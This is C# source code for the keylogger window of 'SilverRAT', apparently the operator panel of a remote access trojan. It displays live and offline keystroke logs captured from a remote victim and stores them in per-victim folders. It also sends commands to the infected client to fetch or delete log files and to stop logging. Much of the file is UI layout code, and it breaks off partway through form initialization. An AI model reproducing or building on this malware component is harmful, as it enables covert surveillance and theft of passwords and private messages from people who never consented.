using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Connection;
using SilverRAT.Handle_Packet;
using SilverRAT.MessagePack;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class Keyloaggar : Form
{
    public StringBuilder SbOnlien = new StringBuilder();

    public StringBuilder SbOfflien = new StringBuilder();

    private IContainer components = null;

    private Panel panelForm;

    private Guna2ResizeBox FormResizeBox1;

    private BunifuPanel PanelTitle;

    public BunifuLoader LoaderConnect;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private Guna2CircleButton ButtonMaximized;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private PictureBox ImageLogo;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    private BunifuPages PageKeyloaggar;

    private TabPage PageOnlien;

    private TabPage PageOfflien;

    private Panel PaneControll;

    private Guna2Button ButOfflien;

    private Guna2Button ButOnlien;

    private ToolStrip toolStrip1;

    private ToolStripLabel toolStripLabel1;

    private ToolStripTextBox SearchOnlien;

    private ToolStripSeparator toolStripSeparator1;

    private ToolStripButton BuSave;

    private ToolStrip toolStrip2;

    private ToolStripLabel toolStripLabel2;

    private ToolStripTextBox SearchOfflien;

    private ToolStripSeparator toolStripSeparator2;

    private ToolStripButton SaveOfflien;

    private ToolStripLabel toolStripLabel3;

    public ToolStripComboBox ComboxLogs;

    private BunifuLabel TitlrPage;

    public RichTextBox richTextBoxOnlien;

    public RichTextBox richTextBoxOfflien;

    private ToolStripButton GetLogger;

    private ToolStripButton DeleteLog;

    private BunifuElipse FormElipse;

    private BunifuDragControl FormDragControl1;

    public System.Windows.Forms.Timer Timer1;

    public Bitmap Logo { get; set; }

    public FormSilver F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public string FullPath { get; set; }

    public Keyloaggar()
    {
        InitializeComponent();
        MinimumSize = base.Size;
    }

    private void Keyloaggar_Load(object sender, EventArgs e)
    {
        try
        {
            string userIDClient = Packet.GetUserIDClient(ParentClient.DGV);
            UserIdInfo.Text = userIDClient;
            string[] array = userIDClient.Split('\\');
            FullPath = Path.Combine(Application.StartupPath, "Clients", "Keylogger\\" + array[0] + "_" + array[1]);
            if (!Directory.Exists(FullPath))
            {
                Directory.CreateDirectory(FullPath);
            }
        }
        catch
        {
            UserIdInfo.Text = "Not Found!";
        }
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
            if (Logo != null)
            {
                ImageLogo.Image = Logo;
            }
        }
        catch
        {
        }
    }

    private void Keyloaggar_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void ButOnlien_Click(object sender, EventArgs e)
    {
        PageKeyloaggar.SelectedIndex = 0;
        TitlrPage.Text = "Onlien";
    }

    private void ButOfflien_Click(object sender, EventArgs e)
    {
        PageKeyloaggar.SelectedIndex = 1;
        TitlrPage.Text = "Offlien";
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void Keyloaggar_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Stop";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
            {
                ThreadPool.QueueUserWorkItem(delegate
                {
                    Client?.Disconnected();
                });
                Close();
            }
        }
        catch
        {
        }
    }

    private void BuSave_Click(object sender, EventArgs e)
    {
        try
        {
            if (!Directory.Exists(FullPath))
            {
                Directory.CreateDirectory(FullPath);
            }
            File.WriteAllText(FullPath + "\\Keylogger_Onlien" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", richTextBoxOnlien.Text.Replace("\n", Environment.NewLine));
        }
        catch
        {
        }
    }

    private void SearchOnlien_KeyDown(object sender, KeyEventArgs e)
    {
        richTextBoxOnlien.SelectionStart = 0;
        richTextBoxOnlien.SelectAll();
        richTextBoxOnlien.SelectionBackColor = Color.White;
        if (e.KeyData != Keys.Return || string.IsNullOrWhiteSpace(SearchOnlien.Text))
        {
            return;
        }
        int num;
        for (int i = 0; i < richTextBoxOnlien.TextLength; i += num + SearchOnlien.Text.Length)
        {
            num = richTextBoxOnlien.Find(SearchOnlien.Text, i, RichTextBoxFinds.None);
            if (num != -1)
            {
                richTextBoxOnlien.SelectionStart = num;
                richTextBoxOnlien.SelectionLength = SearchOnlien.Text.Length;
                richTextBoxOnlien.SelectionBackColor = Color.Yellow;
                continue;
            }
            break;
        }
    }

    private void SearchOfflien_KeyDown(object sender, KeyEventArgs e)
    {
        richTextBoxOfflien.SelectionStart = 0;
        richTextBoxOfflien.SelectAll();
        richTextBoxOfflien.SelectionBackColor = Color.White;
        if (e.KeyData != Keys.Return || string.IsNullOrWhiteSpace(SearchOfflien.Text))
        {
            return;
        }
        int num;
        for (int i = 0; i < richTextBoxOfflien.TextLength; i += num + SearchOfflien.Text.Length)
        {
            num = richTextBoxOfflien.Find(SearchOfflien.Text, i, RichTextBoxFinds.None);
            if (num != -1)
            {
                richTextBoxOfflien.SelectionStart = num;
                richTextBoxOfflien.SelectionLength = SearchOfflien.Text.Length;
                richTextBoxOfflien.SelectionBackColor = Color.Yellow;
                continue;
            }
            break;
        }
    }

    private void SaveOfflien_Click(object sender, EventArgs e)
    {
        try
        {
            if (!Directory.Exists(FullPath))
            {
                Directory.CreateDirectory(FullPath);
            }
            File.WriteAllText(FullPath + "\\Keylogger_Offlien" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", richTextBoxOfflien.Text.Replace("\n", Environment.NewLine));
        }
        catch
        {
        }
    }

    private void GetLogger_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "GetFile";
            msgPack.ForcePathObject("Path").AsString = ComboxLogs.Text;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            richTextBoxOfflien.Clear();
        }
        catch
        {
        }
    }

    private void DeleteLog_Click_1(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Delete";
            msgPack.ForcePathObject("Path").AsString = ComboxLogs.Text;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.Keyloaggar));
        Utilities.BunifuPages.BunifuAnimatorNS.Animation animation = new Utilities.BunifuPages.BunifuAnimatorNS.Animation();
        this.panelForm = new System.Windows.Forms.Panel();
        this.PaneControll = new System.Windows.Forms.Panel();
        this.ButOfflien = new Guna.UI2.WinForms.Guna2Button();
        this.ButOnlien = new Guna.UI2.WinForms.Guna2Button();
        this.PageKeyloaggar = new Bunifu.UI.WinForms.BunifuPages();
        this.PageOnlien = new System.Windows.Forms.TabPage();
        this.toolStrip1 = new System.Windows.Forms.ToolStrip();
        this.toolStripLabel1 = new System.Windows.Forms.ToolStripLabel();
        this.SearchOnlien = new System.Windows.Forms.ToolStripTextBox();
        this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
        this.BuSave = new System.Windows.Forms.ToolStripButton();
        this.richTextBoxOnlien = new System.Windows.Forms.RichTextBox();
        this.PageOfflien = new System.Windows.Forms.TabPage();
        this.toolStrip2 = new System.Windows.Forms.ToolStrip();
        this.toolStripLabel2 = new System.Windows.Forms.ToolStripLabel();
        this.SearchOfflien = new System.Windows.Forms.ToolStripTextBox();
        this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
        this.SaveOfflien = new System.Windows.Forms.ToolStripButton();
        this.toolStripLabel3 = new System.Windows.Forms.ToolStripLabel();
        this.ComboxLogs = new System.Windows.Forms.ToolStripComboBox();
        this.GetLogger = new System.Windows.Forms.ToolStripButton();
        this.DeleteLog = new System.Windows.Forms.ToolStripButton();
        this.richTextBoxOfflien = new System.Windows.Forms.RichTextBox();
        this.FormResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.TitlrPage = new Bunifu.UI.WinForms.BunifuLabel();
        this.LoaderConnect = new Bunifu.UI.WinForms.BunifuLoader();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtonMaximized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageLogo = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.Timer1 = new System.Windows.Forms.Timer(this.components);
        this.panelForm.SuspendLayout();
        this.PaneControll.SuspendLayout();
        this.PageKeyloaggar.SuspendLayout();
        this.PageOnlien.SuspendLayout();
        this.toolStrip1.SuspendLayout();
        this.PageOfflien.SuspendLayout();
        this.toolStrip2.SuspendLayout();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).BeginInit();
        base.SuspendLayout();
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.PaneControll);
        this.panelForm.Controls.Add(this.PageKeyloaggar);
        this.panelForm.Controls.Add(this.FormResizeBox1);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(738, 505);
        this.panelForm.TabIndex = 572;
        this.panelForm.Visible = false;
        this.PaneControll.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PaneControll.Controls.Add(this.ButOfflien);
        this.PaneControll.Controls.Add(this.ButOnlien);
        this.PaneControll.Location = new System.Drawing.Point(16, 112);
        this.PaneControll.Name = "PaneControll";
        this.PaneControll.Size = new System.Drawing.Size(45, 361);
        this.PaneControll.TabIndex = 609;
        this.ButOfflien.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButOfflien.BackColor = System.Drawing.Color.Transparent;
        this.ButOfflien.BorderRadius = 10;
        this.ButOfflien.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButOfflien.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButOfflien.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButOfflien.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButOfflien.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButOfflien.CheckedState.Parent = this.ButOfflien;
        this.ButOfflien.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButOfflien.CustomBorderColor = System.Drawing.Color.White;
        this.ButOfflien.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButOfflien.CustomImages.CheckedImage");
        this.ButOfflien.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButOfflien.CustomImages.HoveredImage");
        this.ButOfflien.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButOfflien.CustomImages.Image");
        this.ButOfflien.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButOfflien.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButOfflien.CustomImages.Parent = this.ButOfflien;
        this.ButOfflien.FillColor = System.Drawing.Color.White;
        this.ButOfflien.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButOfflien.ForeColor = System.Drawing.Color.White;
        this.ButOfflien.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButOfflien.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButOfflien.HoverState.FillColor = System.Drawing.Color.White;
        this.ButOfflien.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButOfflien.HoverState.Parent = this.ButOfflien;
        this.ButOfflien.ImageSize = new System.Drawing.Size(27, 27);
        this.ButOfflien.Location = new System.Drawing.Point(3, 137);
        this.ButOfflien.Name = "ButOfflien";
        this.ButOfflien.PressedColor = System.Drawing.Color.White;
        this.ButOfflien.ShadowDecoration.Parent = this.ButOfflien;
        this.ButOfflien.Size = new System.Drawing.Size(38, 38);
        this.ButOfflien.TabIndex = 20;
        this.ButOfflien.UseTransparentBackground = true;
        this.ButOfflien.Click += new System.EventHandler(ButOfflien_Click);
        this.ButOnlien.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButOnlien.BackColor = System.Drawing.Color.Transparent;
        this.ButOnlien.BorderRadius = 10;
        this.ButOnlien.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButOnlien.Checked = true;
        this.ButOnlien.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButOnlien.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButOnlien.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButOnlien.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButOnlien.CheckedState.Parent = this.ButOnlien;
        this.ButOnlien.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButOnlien.CustomBorderColor = System.Drawing.Color.White;
        this.ButOnlien.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButOnlien.CustomImages.CheckedImage");
        this.ButOnlien.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButOnlien.CustomImages.HoveredImage");
        this.ButOnlien.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButOnlien.CustomImages.Image");
        this.ButOnlien.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButOnlien.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButOnlien.CustomImages.Parent = this.ButOnlien;
        this.ButOnlien.FillColor = System.Drawing.Color.White;
        this.ButOnlien.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButOnlien.ForeColor = System.Drawing.Color.White;
        this.ButOnlien.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButOnlien.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButOnlien.HoverState.FillColor = System.Drawing.Color.White;
        this.ButOnlien.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButOnlien.HoverState.Parent = this.ButOnlien;
        this.ButOnlien.ImageSize = new System.Drawing.Size(27, 27);
        this.ButOnlien.Location = new System.Drawing.Point(3, 93);
        this.ButOnlien.Name = "ButOnlien";
        this.ButOnlien.PressedColor = System.Drawing.Color.White;
        this.ButOnlien.ShadowDecoration.Parent = this.ButOnlien;
        this.ButOnlien.Size = new System.Drawing.Size(38, 38);
        this.ButOnlien.TabIndex = 19;
        this.ButOnlien.UseTransparentBackground = true;
        this.ButOnlien.Click += new System.EventHandler(ButOnlien_Click);
        this.PageKeyloaggar.Alignment = System.Windows.Forms.TabAlignment.Bottom;
        this.PageKeyloaggar.AllowTransitions = false;
        this.PageKeyloaggar.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PageKeyloaggar.Controls.Add(this.PageOnlien);
        this.PageKeyloaggar.Controls.Add(this.PageOfflien);
        this.PageKeyloaggar.Location = new System.Drawing.Point(67, 112);
        this.PageKeyloaggar.Multiline = true;
        this.PageKeyloaggar.Name = "PageKeyloaggar";
        this.PageKeyloaggar.Page = this.PageOnlien;
        this.PageKeyloaggar.PageIndex = 0;
        this.PageKeyloaggar.PageName = "PageOnlien";
        this.PageKeyloaggar.PageTitle = "Onlien";
        this.PageKeyloaggar.SelectedIndex = 0;
        this.PageKeyloaggar.Size = new System.Drawing.Size(655, 361);
        this.PageKeyloaggar.TabIndex = 601;
        animation.AnimateOnlyDifferences = false;
        animation.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation1.BlindCoeff");
        animation.LeafCoeff = 0f;
        animation.MaxTime = 1f;
        animation.MinTime = 0f;
        animation.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation1.MosaicCoeff");
        animation.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation1.MosaicShift");
        animation.MosaicSize = 0;
        animation.Padding = new System.Windows.Forms.Padding(0);
        animation.RotateCoeff = 0f;
        animation.RotateLimit = 0f;
        animation.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation1.ScaleCoeff");
        animation.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation1.SlideCoeff");
        animation.TimeCoeff = 0f;
        animation.TransparencyCoeff = 0f;
        this.PageKeyloaggar.Transition = animation;
        this.PageKeyloaggar.TransitionType = Utilities.BunifuPages.BunifuAnimatorNS.AnimationType.Custom;
        this.PageOnlien.Controls.Add(this.toolStrip1);
        this.PageOnlien.Controls.Add(this.richTextBoxOnlien);
        this.PageOnlien.Location = new System.Drawing.Point(4, 4);
        this.PageOnlien.Name = "PageOnlien";
        this.PageOnlien.Padding = new System.Windows.Forms.Padding(3);
        this.PageOnlien.Size = new System.Drawing.Size(647, 335);
        this.PageOnlien.TabIndex = 0;
        this.PageOnlien.Text = "Onlien";
        this.PageOnlien.UseVisualStyleBackColor = true;
        this.toolStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
        this.toolStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.toolStripLabel1, this.SearchOnlien, this.toolStripSeparator1, this.BuSave });
        this.toolStrip1.Location = new System.Drawing.Point(3, 3);
        this.toolStrip1.Name = "toolStrip1";
        this.toolStrip1.Size = new System.Drawing.Size(641, 25);
        this.toolStrip1.TabIndex = 1;
        this.toolStrip1.Text = "toolStrip1";
        this.toolStripLabel1.Name = "toolStripLabel1";
        this.toolStripLabel1.Size = new System.Drawing.Size(42, 22);
        this.toolStripLabel1.Text = "Search";
        this.SearchOnlien.Font = new System.Drawing.Font("Microsoft YaHei UI", 9f);
        this.SearchOnlien.Name = "SearchOnlien";
        this.SearchOnlien.Size = new System.Drawing.Size(68, 25);
        this.SearchOnlien.Text = "...";
        this.SearchOnlien.KeyDown += new System.Windows.Forms.KeyEventHandler(SearchOnlien_KeyDown);
        this.toolStripSeparator1.Name = "toolStripSeparator1";
        this.toolStripSeparator1.Size = new System.Drawing.Size(6, 25);
        this.BuSave.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.BuSave.Image = (System.Drawing.Image)resources.GetObject("BuSave.Image");
        this.BuSave.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.BuSave.Name = "BuSave";
        this.BuSave.Size = new System.Drawing.Size(35, 22);
        this.BuSave.Text = "Save";
        this.BuSave.Click += new System.EventHandler(BuSave_Click);
        this.richTextBoxOnlien.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.richTextBoxOnlien.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.richTextBoxOnlien.Location = new System.Drawing.Point(6, 31);
        this.richTextBoxOnlien.Name = "richTextBoxOnlien";
        this.richTextBoxOnlien.ReadOnly = true;
        this.richTextBoxOnlien.Size = new System.Drawing.Size(638, 301);
        this.richTextBoxOnlien.TabIndex = 0;
        this.richTextBoxOnlien.Tag = "";
        this.richTextBoxOnlien.Text = "";
        this.PageOfflien.Controls.Add(this.toolStrip2);
        this.PageOfflien.Controls.Add(this.richTextBoxOfflien);
        this.PageOfflien.Location = new System.Drawing.Point(4, 4);
        this.PageOfflien.Name = "PageOfflien";
        this.PageOfflien.Padding = new System.Windows.Forms.Padding(3);
        this.PageOfflien.Size = new System.Drawing.Size(647, 335);
        this.PageOfflien.TabIndex = 1;
        this.PageOfflien.Text = "Offlien";
        this.PageOfflien.UseVisualStyleBackColor = true;
        this.toolStrip2.ImageScalingSize = new System.Drawing.Size(24, 24);
        this.toolStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.toolStripLabel2, this.SearchOfflien, this.toolStripSeparator2, this.SaveOfflien, this.toolStripLabel3, this.ComboxLogs, this.GetLogger, this.DeleteLog });
        this.toolStrip2.Location = new System.Drawing.Point(3, 3);
        this.toolStrip2.Name = "toolStrip2";
        this.toolStrip2.Size = new System.Drawing.Size(641, 25);
        this.toolStrip2.TabIndex = 3;
        this.toolStrip2.Text = "toolStrip2";
        this.toolStripLabel2.Name = "toolStripLabel2";
        this.toolStripLabel2.Size = new System.Drawing.Size(42, 22);
        this.toolStripLabel2.Text = "Search";
        this.SearchOfflien.Font = new System.Drawing.Font("Microsoft YaHei UI", 9f);
        this.SearchOfflien.Name = "SearchOfflien";
        this.SearchOfflien.Size = new System.Drawing.Size(68, 25);
        this.SearchOfflien.Text = "...";
        this.SearchOfflien.KeyDown += new System.Windows.Forms.KeyEventHandler(SearchOfflien_KeyDown);
        this.toolStripSeparator2.Name = "toolStripSeparator2";
        this.toolStripSeparator2.Size = new System.Drawing.Size(6, 25);
        this.SaveOfflien.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.SaveOfflien.Image = (System.Drawing.Image)resources.GetObject("SaveOfflien.Image");
        this.SaveOfflien.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.SaveOfflien.Name = "SaveOfflien";
        this.SaveOfflien.Size = new System.Drawing.Size(35, 22);
        this.SaveOfflien.Text = "Save";
        this.SaveOfflien.Click += new System.EventHandler(SaveOfflien_Click);
        this.toolStripLabel3.Name = "toolStripLabel3";
        this.toolStripLabel3.Size = new System.Drawing.Size(56, 22);
        this.toolStripLabel3.Text = "     Logs : ";
        this.ComboxLogs.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.ComboxLogs.Name = "ComboxLogs";
        this.ComboxLogs.Size = new System.Drawing.Size(121, 25);
        this.GetLogger.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.GetLogger.Image = (System.Drawing.Image)resources.GetObject("GetLogger.Image");
        this.GetLogger.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.GetLogger.Name = "GetLogger";
        this.GetLogger.Size = new System.Drawing.Size(58, 22);
        this.GetLogger.Text = "Get Loge";
        this.GetLogger.Click += new System.EventHandler(GetLogger_Click);
        this.DeleteLog.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.DeleteLog.ForeColor = System.Drawing.Color.Red;
        this.DeleteLog.Image = (System.Drawing.Image)resources.GetObject("DeleteLog.Image");
        this.DeleteLog.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.DeleteLog.Name = "DeleteLog";
        this.DeleteLog.Size = new System.Drawing.Size(47, 22);
        this.DeleteLog.Text = " Delete";
        this.DeleteLog.Click += new System.EventHandler(DeleteLog_Click_1);
        this.richTextBoxOfflien.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.richTextBoxOfflien.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.richTextBoxOfflien.Location = new System.Drawing.Point(6, 31);
        this.richTextBoxOfflien.Name = "richTextBoxOfflien";
        this.richTextBoxOfflien.ReadOnly = true;
        this.richTextBoxOfflien.Size = new System.Drawing.Size(638, 301);
        this.richTextBoxOfflien.TabIndex = 2;
        this.richTextBoxOfflien.Tag = "";
        this.richTextBoxOfflien.Text = "";
        this.FormResizeBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.FormResizeBox1.ForeColor = System.Drawing.Color.Empty;
        this.FormResizeBox1.Location = new System.Drawing.Point(711, 479);
        this.FormResizeBox1.Name = "FormResizeBox1";
        this.FormResizeBox1.Size = new System.Drawing.Size(20, 20);
        this.FormResizeBox1.TabIndex = 600;
        this.FormResizeBox1.TargetControl = this;
        this.PanelTitle.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTitle.BackgroundColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTitle.BackgroundImage");
        this.PanelTitle.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTitle.BorderColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.PanelTitle.BorderRadius = 22;
        this.PanelTitle.BorderThickness = 1;
        this.PanelTitle.Controls.Add(this.TitlrPage);
        this.PanelTitle.Controls.Add(this.LoaderConnect);
        this.PanelTitle.Controls.Add(this.ButtClose);
        this.PanelTitle.Controls.Add(this.ButtionMinimized);
        this.PanelTitle.Controls.Add(this.ButtonMaximized);
        this.PanelTitle.Controls.Add(this.UserIdInfo);
        this.PanelTitle.Controls.Add(this.bunifuLabel1);
        this.PanelTitle.Controls.Add(this.ImageLogo);
        this.PanelTitle.Cursor = System.Windows.Forms.Cursors.SizeAll;
        this.PanelTitle.Location = new System.Drawing.Point(16, 22);
        this.PanelTitle.Name = "PanelTitle";
        this.PanelTitle.ShowBorders = true;
        this.PanelTitle.Size = new System.Drawing.Size(708, 77);
        this.PanelTitle.TabIndex = 596;
        this.TitlrPage.AllowParentOverrides = false;
        this.TitlrPage.AutoEllipsis = false;
        this.TitlrPage.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.TitlrPage.CursorType = null;
        this.TitlrPage.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TitlrPage.ForeColor = System.Drawing.Color.DarkGray;
        this.TitlrPage.Location = new System.Drawing.Point(142, 19);
        this.TitlrPage.Name = "TitlrPage";
        this.TitlrPage.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitlrPage.Size = new System.Drawing.Size(35, 15);
        this.TitlrPage.TabIndex = 610;
        this.TitlrPage.Text = "Onlien";
        this.TitlrPage.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.TitlrPage.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.LoaderConnect.AllowStylePresets = true;
        this.LoaderConnect.BackColor = System.Drawing.Color.Transparent;
        this.LoaderConnect.CapStyle = Bunifu.UI.WinForms.BunifuLoader.CapStyles.Flat;
        this.LoaderConnect.Color = System.Drawing.Color.FromArgb(87, 59, 255);
        this.LoaderConnect.Colors = new Bunifu.UI.WinForms.Bloom[0];
        this.LoaderConnect.Cursor = System.Windows.Forms.Cursors.Arrow;
        this.LoaderConnect.Customization = "";
        this.LoaderConnect.DashWidth = 0.5f;
        this.LoaderConnect.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.LoaderConnect.Image = null;
        this.LoaderConnect.Location = new System.Drawing.Point(12, 13);
        this.LoaderConnect.Name = "LoaderConnect";
        this.LoaderConnect.NoRounding = false;
        this.LoaderConnect.Preset = Bunifu.UI.WinForms.BunifuLoader.StylePresets.Dashed;
